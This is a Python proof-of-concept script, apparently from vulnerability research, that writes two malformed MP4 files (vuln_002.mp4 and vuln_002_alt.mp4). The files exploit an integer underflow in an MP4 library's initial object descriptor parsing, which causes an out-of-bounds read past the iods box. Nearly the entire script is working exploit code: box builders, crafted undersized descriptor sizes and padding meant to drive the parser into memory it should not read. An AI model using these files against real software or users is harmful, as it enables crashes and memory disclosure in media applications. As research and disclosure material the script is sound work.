#!/usr/bin/env python3
"""
PoC generator for VULN 002:
  Integer Underflow in AP4_InitialObjectDescriptor Substream Size -> Out-of-Bounds Read

Source: Ap4ObjectDescriptor.cpp lines 254-255
  AP4_SubStream* substream = new AP4_SubStream(stream, offset,
                                               payload_size - AP4_Size(offset - start));

When the IOD constructor reads MORE bytes from the stream than payload_size declares,
the subtraction `payload_size - consumed` wraps as unsigned -> huge SubStream size ->
reads arbitrary data past the iods atom boundary.

Approach 1 (primary): url_flag=0, payload_size=3
  - IOD reads: 2B bits + 5B profile/level = 7 bytes consumed
  - Underflow: 3 - 7 = 0xFFFFFFFC

Approach 2 (secondary): url_flag=1, url_length=255, payload_size=4
  - IOD reads: 2B bits + 1B url_length + 255B URL = 258 bytes consumed
  - Underflow: 4 - 258 = 0xFFFFFEFE

Uses only Python standard library (struct, bytes, os, sys).
"""
import struct
import os
import sys


def expandable_size(size):
    """Encode size using MPEG-4 expandable class size (1-4 bytes)."""
    if size < 0x80:
        return bytes([size])
    elif size < 0x4000:
        return bytes([0x80 | (size >> 7), size & 0x7F])
    else:
        raise ValueError(f"Size {size} too large for 2-byte encoding")


def make_box(box_type, content):
    """Construct an MP4 box: 4B big-endian size + 4B ASCII type + content."""
    assert len(box_type) == 4
    size = 8 + len(content)
    return struct.pack('>I', size) + box_type.encode('ascii') + content


def make_ftyp():
    """Minimal ftyp box."""
    content = b'isom'                # major brand
    content += struct.pack('>I', 0)  # minor version
    content += b'isom'               # compatible brand
    return make_box('ftyp', content)


def make_mvhd():
    """Version-0 mvhd box (108 bytes total)."""
    content  = struct.pack('>B', 0)           # version = 0
    content += b'\x00\x00\x00'                # flags
    content += struct.pack('>I', 0)            # creation_time
    content += struct.pack('>I', 0)            # modification_time
    content += struct.pack('>I', 1000)         # timescale
    content += struct.pack('>I', 0)            # duration
    content += struct.pack('>I', 0x00010000)   # rate = 1.0 (16.16 fixed)
    content += struct.pack('>H', 0x0100)       # volume = 1.0 (8.8 fixed)
    content += b'\x00' * 10                    # reserved
    # Unity matrix (9 x 4 bytes = 36 bytes)
    content += struct.pack('>9I',
        0x00010000, 0x00000000, 0x00000000,
        0x00000000, 0x00010000, 0x00000000,
        0x00000000, 0x00000000, 0x40000000)
    content += b'\x00' * 24                    # pre-defined
    content += struct.pack('>I', 1)            # next_track_ID
    # content = 100 bytes; total box = 108 bytes
    return make_box('mvhd', content)


def make_iods_approach1():
    """
    iods FullBox with IOD descriptor triggering url_flag=0 underflow.

    IOD descriptor layout (Ap4ObjectDescriptor.cpp ~line 229-255):
      stream.ReadUI16(bits)                    <- 2 bytes
      if url_flag==0:
        stream.ReadUI08(od_profile)            <- 1 byte  (byte 3 = last declared)
        stream.ReadUI08(scene_profile)         <- 1 byte  (byte 4, BEYOND declared!)
        stream.ReadUI08(audio_profile)         <- 1 byte
        stream.ReadUI08(visual_profile)        <- 1 byte
        stream.ReadUI08(graphics_profile)      <- 1 byte
      Total consumed: 7 bytes

    Declared payload_size = 3.
    offset - start = 7.
    payload_size - (offset - start) = 3 - 7 = 0xFFFFFFFC (unsigned wrap).
    SubStream created with size 0xFFFFFFFC -> reads past iods atom boundary.
    """
    # bits field: OD_ID=1 (bits 15:6 -> 0x0040), URL_Flag=0 (bit 5 clear),
    #             IncludeInlineProfileLevelFlag=0 (bit 4 clear), reserved=0x01
    bits = 0x0041

    iod_fields  = struct.pack('>H', bits)  # 2 bytes: bits
    iod_fields += b'\xff'                  # od_profile_level_indication  (byte 3)
    iod_fields += b'\xff'                  # scene_profile_level           (byte 4, past payload)
    iod_fields += b'\xff'                  # audio_profile_level           (byte 5)
    iod_fields += b'\xff'                  # visual_profile_level          (byte 6)
    iod_fields += b'\xff'                  # graphics_profile_level        (byte 7)
    # Total IOD fields: 7 bytes; declared payload_size: 3

    # Padding bytes in the iods box after the IOD descriptor fields.
    # After the underflow, the SubStream (size=0xFFFFFFFC) wraps the raw file stream.
    # The while loop in the constructor will attempt to parse descriptors from
    # whatever data follows at this file position.  Give it realistic-looking bytes
    # so the iteration is exercised rather than immediately returning EOF.
    padding = b'\xff\x01\x00' * 16  # 48 bytes: each triple looks like a 1-byte descriptor

    # Descriptor wire format: tag(1) + declared_size(1) + actual_fields(7) + padding
    declared_size = 3  # intentionally smaller than the 7 bytes actually consumed
    descriptor = bytes([0x02]) + expandable_size(declared_size) + iod_fields + padding

    # iods FullBox = version(1B) + flags(3B) + descriptor
    fullbox_header = struct.pack('>B', 0) + b'\x00\x00\x00'
    iods_content = fullbox_header + descriptor

    return make_box('iods', iods_content)


def make_iods_approach2():
    """
    iods FullBox with IOD descriptor triggering url_flag=1 underflow.

    IOD reads: 2B bits + 1B url_length(=255) + 255B URL = 258 bytes.
    Declared payload_size = 4.
    Underflow: 4 - 258 = 0xFFFFFEFE.
    """
    # bits: OD_ID=1, URL_Flag=1 (bit 5 set = 0x0020), reserved=0x01
    bits = 0x0061  # 0x0040 | 0x0020 | 0x0001

    iod_fields  = struct.pack('>H', bits)  # 2 bytes
    iod_fields += bytes([255])             # url_length = 255
    iod_fields += b'\x41' * 255           # URL bytes ('A' * 255)
    # Total: 258 bytes; declared payload_size: 4

    padding = b'\x00' * 32

    declared_size = 4
    descriptor = bytes([0x02]) + expandable_size(declared_size) + iod_fields + padding

    fullbox_header = struct.pack('>B', 0) + b'\x00\x00\x00'
    iods_content = fullbox_header + descriptor

    return make_box('iods', iods_content)


def build_mp4(iods_box, label):
    ftyp = make_ftyp()
    mvhd = make_mvhd()

    moov_content = mvhd + iods_box
    moov = make_box('moov', moov_content)

    # mdat with 512 bytes of zeros - provides extra data for the giant SubStream to read
    mdat = make_box('mdat', b'\x00' * 512)

    return ftyp + moov + mdat


def main():
    poc_dir = os.path.dirname(os.path.abspath(__file__))

    # --- Approach 1 (primary) ---
    iods1 = make_iods_approach1()
    mp4_1 = build_mp4(iods1, 'approach1')
    out1 = os.path.join(poc_dir, 'vuln_002.mp4')
    with open(out1, 'wb') as f:
        f.write(mp4_1)
    print(f"[+] Approach 1 (url_flag=0, payload_size=3): {len(mp4_1)} bytes -> {out1}")
    print(f"    Trigger: 3 - 7 = 0xFFFFFFFC underflow in SubStream size")

    # --- Approach 2 (secondary) ---
    iods2 = make_iods_approach2()
    mp4_2 = build_mp4(iods2, 'approach2')
    out2 = os.path.join(poc_dir, 'vuln_002_alt.mp4')
    with open(out2, 'wb') as f:
        f.write(mp4_2)
    print(f"[+] Approach 2 (url_flag=1, url_length=255, payload_size=4): {len(mp4_2)} bytes -> {out2}")
    print(f"    Trigger: 4 - 258 = 0xFFFFFEFE underflow in SubStream size")


if __name__ == '__main__':
    main()
